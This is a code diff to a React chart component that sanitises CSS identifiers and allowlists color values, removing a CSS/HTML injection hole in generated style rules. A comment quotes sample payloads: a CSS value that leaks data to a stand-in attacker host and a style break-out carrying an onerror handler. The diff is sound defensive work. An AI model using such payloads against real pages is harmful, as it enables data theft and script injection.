@@ -70,7 +70,11 @@ function ChartContainer({
   };
 }) {
   const uniqueId = React.useId();
-  const chartId = `chart-${id ?? uniqueId.replace(/:/g, '')}`;
+  // `id` is caller-supplied and lands in a CSS attribute selector, so strip
+  // anything outside the ident charset. This also normalises `useId()` across
+  // React versions (18 emits `:r0:`, 19 emits `_r_0_`) and any custom
+  // `identifierPrefix`.
+  const chartId = `chart-${cssIdent(id ?? uniqueId)}`;
 
   return (
     <ChartContext.Provider value={{ config }}>
@@ -94,37 +98,122 @@ function ChartContainer({
   );
 }
 
+/**
+ * Strip everything outside the CSS ident charset. Used for values that end up
+ * inside a selector or a custom-property name.
+ */
+function cssIdent(value: string): string {
+  return value.replace(/[^A-Za-z0-9_-]/g, '');
+}
+
+/**
+ * A deliberately conservative allowlist for CSS color values.
+ *
+ * Permits every notation the chart palette actually uses — `#rrggbb`,
+ * `rgb()/hsl()/oklch()/lab()/color-mix()`, `var(--token)`, and bare keywords
+ * like `transparent` — by allowing only alphanumerics, `#`, parentheses,
+ * commas, dots, `%`, `/`, whitespace, `_` and `-`.
+ *
+ * Every character that could terminate the declaration or the rule is absent:
+ * `;` `{` `}` `:` `<` `>` `"` `'` `\` `@` `*`. That blocks both CSS injection
+ * (`red;background:url(https://attacker/?leak=…)`) and the HTML break-out
+ * (`red}</style><img src=x onerror=…>`).
+ */
+const SAFE_CSS_COLOR = /^[A-Za-z0-9#(),./%\s_-]{1,128}$/;
+
+function isSafeCssColor(color: string): boolean {
+  return SAFE_CSS_COLOR.test(color);
+}
+
+/**
+ * Emits the per-series `--color-<key>` custom properties, one rule per theme.
+ *
+ * ## Security
+ *
+ * `config` keys and colors may originate from model output (see
+ * `ChartArtifact`, which maps `valueKey[].color` straight into a config).
+ *
+ * Two independent defences:
+ *
+ * 1. The CSS is passed as a **text child**, not via `dangerouslySetInnerHTML`.
+ *    React escapes `</style` in text children (client-side it never parses as
+ *    HTML at all), so a value cannot close the element and inject markup.
+ * 2. Keys and colors are validated before interpolation, so a value cannot
+ *    inject extra CSS declarations either.
+ *
+ * A series whose key or any of whose colors fails validation is dropped whole,
+ * across every theme — never partially. A chart that renders a color in dark
+ * mode but not light mode would be worse than one that falls back to the
+ * default palette. Dropping never throws: a malformed color from a model must
+ * not take down the chart.
+ */
+type ThemeName = keyof typeof THEMES;
+
 const ChartStyle = ({ id, config }: { id: string; config: ChartConfig }) => {
   const colorConfig = Object.entries(config).filter(
     ([, config]) => config.theme ?? config.color,
   );
 
-  if (!colorConfig.length) {
+  if (!colorConfig.length || !id) {
     return null;
   }
 
-  return (
-    <style
-      dangerouslySetInnerHTML={{
-        __html: Object.entries(THEMES)
-          .map(
-            ([theme, prefix]) => `
-${prefix} [data-chart=${id}] {
-${colorConfig
-  .map(([key, itemConfig]) => {
-    const color =
-      itemConfig.theme?.[theme as keyof typeof itemConfig.theme] ??
-      itemConfig.color;
-    return color ? `  --color-${key}: ${color};` : null;
-  })
-  .join('\n')}
-}
-`,
-          )
-          .join('\n'),
-      }}
-    />
-  );
+  // Validate once per series rather than once per theme, so a single bad value
+  // produces a single warning.
+  const safeSeries: {
+    key: string;
+    colors: Partial<Record<ThemeName, string>>;
+  }[] = [];
+
+  for (const [key, itemConfig] of colorConfig) {
+    const safeKey = cssIdent(key);
+    const colors: Partial<Record<ThemeName, string>> = {};
+    let usable = safeKey.length > 0 && safeKey === key;
+
+    if (usable) {
+      for (const theme of Object.keys(THEMES) as ThemeName[]) {
+        const color = itemConfig.theme?.[theme] ?? itemConfig.color;
+        if (!color) continue;
+        if (!isSafeCssColor(color)) {
+          usable = false;
+          break;
+        }
+        colors[theme] = color;
+      }
+    }
+
+    if (!usable) {
+      // Warned unconditionally: this package ships raw tsc output, so it can
+      // assume neither a bundler that inlines `process.env.NODE_ENV` nor a
+      // runtime where `process` exists. A dropped series is rare and
+      // security-relevant — worth surfacing in production too.
+      console.warn(
+        `[rx-data] ChartStyle dropped an unsafe series entry: ${JSON.stringify({ key })}`,
+      );
+      continue;
+    }
+
+    safeSeries.push({ key: safeKey, colors });
+  }
+
+  const css = (Object.entries(THEMES) as [ThemeName, string][])
+    .map(([theme, prefix]) => {
+      const declarations = safeSeries
+        .filter((series) => series.colors[theme])
+        .map((series) => `  --color-${series.key}: ${series.colors[theme]};`);
+
+      if (!declarations.length) return null;
+
+      return `${prefix} [data-chart="${id}"] {\n${declarations.join('\n')}\n}`;
+    })
+    .filter((rule): rule is string => rule !== null)
+    .join('\n');
+
+  if (!css) {
+    return null;
+  }
+
+  return <style>{css}</style>;
 };
 
 const ChartTooltip = RechartsPrimitive.Tooltip;
